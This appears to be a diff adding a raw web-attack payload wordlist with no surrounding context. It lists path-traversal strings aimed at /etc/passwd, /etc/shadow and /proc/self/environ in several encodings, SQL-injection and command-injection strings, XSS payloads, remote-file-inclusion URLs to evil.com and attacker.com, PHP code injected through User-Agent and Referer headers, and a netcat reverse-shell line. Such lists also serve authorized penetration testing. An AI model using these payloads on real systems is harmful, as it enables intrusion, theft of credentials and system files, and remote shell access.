@@ -1,0 +1,101 @@
+../../../../../../etc/passwd
+../../../../../../etc/shadow
+../../../../../../etc/hosts
+../../../../../../var/www/html/index.php
+../../../../../../proc/self/environ
+../../../../../../dev/null
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+%2e%2e/%2e%2e/%2e%2e/%2e%2e/var/www/html/index.php
+..%c0%af..%c0%af..%c0%afetc/passwd
+' OR 1=1 --
+' OR 'a'='a
+' OR '1'='1' --
+" OR "1"="1
+' OR ''='
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+') or ('a'='a
+' OR SLEEP(5) --
+| ls
+; ls
+|| ls
+| whoami
+; whoami
+|| whoami
+| id
+; id
+|| id
+`whoami`
+$(whoami)
+| nc -e /bin/sh 192.168.1.10 4444
+<script>alert('XSS')</script>
+"><script>alert(1)</script>
+"><svg/onload=alert(1)>
+<script>alert(document.cookie)</script>
+"><img src=x onerror=alert(1)>
+"><body onload=alert(1)>
+<svg onload=alert(1)>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+"><svg onload=alert(/XSS/)
+../../../../../../etc/passwd
+../../../../../../etc/shadow
+../../../../../../proc/self/environ
+../../../../../../var/www/html/config.php
+../../../../../../var/log/apache2/access.log
+../../../../../../var/log/apache2/error.log
+../../../../../../var/www/html/index.php
+../etc/passwd
+../etc/shadow
+../proc/self/environ
+../var/www/html/config.php
+http://attacker.com/shell.txt
+https://evil.com/malicious.php
+http://evil.com/shell.php
+http://localhost/shell.txt
+http://localhost/malicious.php
+/admin/
+/login/
+/test/
+/backup/
+/config/
+/cgi-bin/
+/uploads/
+/private/
+/logs/
+/tmp/
+../../../../../../etc/passwd%00
+../../../../../../etc/shadow%00
+../../../../../../var/www/html/index.php%00
+PUT /test.txt HTTP/1.1
+Host: example.com
+Content-Length: 0
+DELETE /test.txt HTTP/1.1
+Host: example.com
+HEAD / HTTP/1.1
+Host: example.com
+TRACE / HTTP/1.1
+Host: example.com
+OPTIONS / HTTP/1.1
+Host: example.com
+/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/proc/self/environ
+/%u002e%u002e/%u002e%u002e/%u002e%u002e/etc/passwd
+/%c0%af%c0%afetc/passwd
+User-Agent: <?php system('ls'); ?>
+Referer: <?php system('id'); ?>
+X-Forwarded-For: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+id; ls
+id|ls
+id||ls
+id && ls
+$(id)
+$(ls)
+`id`
+`ls`
+$(whoami)
